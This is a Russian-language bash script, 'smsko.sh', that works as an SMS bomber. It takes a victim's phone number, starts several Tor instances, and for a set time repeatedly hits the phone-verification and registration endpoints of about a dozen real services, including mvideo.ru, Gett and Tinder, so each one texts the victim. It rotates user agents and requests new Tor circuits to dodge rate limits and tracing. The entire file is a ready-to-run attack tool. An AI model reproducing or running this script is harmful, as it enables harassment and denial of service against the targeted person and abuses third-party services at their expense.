#!/bin/bash

## smsko.sh
## Author: Nemoize
## GitHub: github.com/nemoize/smsko

command -v netcat &>/dev/null || { echo >&2 "Выполните установку netcat."; exit 1; }
command -v curl &>/dev/null || { echo >&2 "Выполните установку curl."; exit 1; }
command -v tor &>/dev/null || { echo >&2 "Выполните установку tor."; exit 1; }

def_connect=5	#5
def_seconds=120	#120

BOMB(){
	sleep 1
	def_seconds=`date +%s`
	while [[ $((`date +%s` - def_seconds)) -lt seconds ]]; do #|| seconds -eq '0' ]]; do
		TORC "$1" "$2"
		USER
curl -X POST --socks5-hostname localhost:$1 -A "$UA" -b tmp -s 'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode?pageName=registerPrivateUserPhoneVerification' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "phone=${numb:1:3}-${numb:4:7}&g-recaptcha-response&recaptcha=on" -e 'https://www.mvideo.ru/register?sn=false' &>/dev/null &
curl -X POST --socks5-hostname localhost:$1 -A "$UA" -b tmp -s 'https://bicco.ru/youdo/login/' -H 'Content-Type: application/x-www-form-urlencoded' -d "ajax_call=y&action=register&phone=$numb" -e 'https://bicco.ru/youdo/login/' &>/dev/null &
curl --socks5-hostname localhost:$1 -A "$UA" -b tmp -s "https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber=+7%20(${numb:1:3})${numb:4:3}-${numb:7:2}-${numb:9:2}" -H 'X-Requested-With: XMLHttpRequest' -e 'https://fundayshop.com/' &>/dev/null &
curl --socks5-hostname localhost:$1 -A "$UA" -b tmp -s "https://ostin.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber=%207%20(${numb:1:3})${numb:4:3}-${numb:7:2}-${numb:9:2}" -H 'X-Requested-With: XMLHttpRequest' -e 'https://ostin.com/' &>/dev/null &
t_gett=$(curl --socks5-hostname localhost:$1 -A "$UA" -s 'https://driver.gett.ru/login/' | grep 'csrfmiddlewaretoken' | cut -d "'" -f6 ) && curl -X POST --socks5-hostname localhost:$1 -A "$UA" -L -b tmp -s 'https://driver.gett.ru/api/login/phone/' -H 'Content-Type: application/json' -H "X-CSRFToken: $t_gett" -H "Cookie: csrftoken=$t_gett" -d '{"phone":"+7 ('${numb:1:3}') '${numb:4:3}\-${numb:7:2}\-${numb:9:2}\"',"registration":false}' -e 'https://driver.gett.ru/login/' &>/dev/null &
curl -X POST --socks5-hostname localhost:$1 -A "$UA" -b tmp -s 'https://vipfish.ru/?action=auth' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "CSRF=&ACTION=REGISTER&MODE=PHONE&PHONE=%2B7+(${numb:1:3})+${numb:4:3}-${numb:7:2}-${numb:9:2}&PASSWORD=a92910Z8223B&PASSWORD2=a92910Z8223B" -e 'https://vipfish.ru/?version=mobile' &>/dev/null &
curl -X POST --socks5-hostname localhost:$1 -A "$UA" -b tmp -s 'https://www.xn--80aicstx0byb.xn--p1ai/?action=auth' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "CSRF=&ACTION=REGISTER&MODE=PHONE&PHONE=%2B7+(${numb:1:3})+${numb:4:3}-${numb:7:2}-${numb:9:2}&PASSWORD=a92910Z8223B&PASSWORD2=a92910Z8223B" -e 'https://www.xn--80aicstx0byb.xn--p1ai/' &>/dev/null &
curl -X POST --socks5-hostname localhost:$1 -A "$UA" -b tmp -s 'https://radugavkusaufa.ru/?action=auth&act=132' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "CSRF=&ACTION=REGISTER&MODE=PHONE&PHONE=%2B7+(${numb:1:3})+${numb:4:3}-${numb:7:2}-${numb:9:2}&PASSWORD=aRe123Z8223B&PASSWORD2=aRe123Z8223B" -e 'https://radugavkusaufa.ru/' &>/dev/null &
curl -X POST --socks5-hostname localhost:$1 -A "$UA" -b tmp -s 'https://www.molbulak.ru/ajax/smsservice.php' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "command=send_code&phone=%2B7(${numb:1:3})+-+${numb:4:3}+-+${numb:7:2}+-+${numb:9:2}" -e 'https://www.molbulak.ru/personal/' &>/dev/null &
curl -X POST --socks5-hostname localhost:$1 -A "$UA" -b tmp -s 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' -H 'content-type: application/json' -d '{"phone_number":"'$numb'"}' -e 'https://tinder.com/' &>/dev/null &
		wait
		#echo -e "AUTHENTICATE \"$tor_pass\"\r\nsignal NEWNYM\r\nQUIT" > /dev/tcp/127.0.0.1/$2
		echo -e "AUTHENTICATE \"$tor_pass\"\r\nsignal NEWNYM\r\nQUIT" | nc 127.0.0.1 $2 > /dev/null
		echo -e " \e[1;34m#\e[0;37m $numb\e[1;34m | \e[0;37m$(($(date +%s) - def_seconds))\e[0m"
	done
}

USER(){
	case $(shuf -i 1-9 -n 1) in
	1) UA='Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7';;
	2) UA='Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1';;
	3) UA='Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36';;
	4) UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240';;
	5) UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10547';;
	6) UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/14.14359';;
	7) UA='Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15';;
	8) UA='Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36';;
	9) UA='Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24';;
	esac
}

TORC(){
	for _ in {1..10}; do
		curl -m 10 --socks5-hostname localhost:$1 -s https://check.torproject.org > /dev/null
	[[ $? -eq 0 ]] && break
		#echo -e "AUTHENTICATE \"$tor_pass\"\r\nsignal NEWNYM\r\nQUIT" > /dev/tcp/127.0.0.1/$2
		echo -e "AUTHENTICATE \"$tor_pass\"\r\nsignal NEWNYM\r\nQUIT" | nc 127.0.0.1 $2 > /dev/null
	done
}

while [[ $1 ]]; do
	case $1 in
	-t) shift
	seconds=$1
	;;
	-T) shift
	connect=$1
	;;
	*)
	numb=${1//[:punch:|a-z|A-Z|+|\-|(|)| ]}
	;;
	esac
	shift 
done

[[ ${#numb} -gt 10 && ${#numb} -lt 14 ]] || { echo -e "\n $0 <Номер>\n\t-t\t- Время работы (def $def_seconds)\n\t-T\t- Количество ТОР (def $def_connect)\n"; exit 0; }
connect=${connect:=${def_connect}}
seconds=${seconds:=${def_seconds}}

tor_pass=`date +%s`
tor_hash=`tor --hash-password $tor_pass`

[ -d 'tor.tmp' ] || mkdir 'tor.tmp'
for (( i=1; i<=connect; i++ )); do
	((tsp=9050+i))
	((tcp=8118+i))
	tor --ClientOnly 1 --CookieAuthentication 0 --HashedControlPassword $tor_hash --ControlPort $tcp --PidFile tor_$i.pid --SocksPort $tsp --DataDirectory tor.tmp/tor_$i > /dev/null &
	BOMB "$tsp" "$tcp" "$i" &
done
wait

exit 0

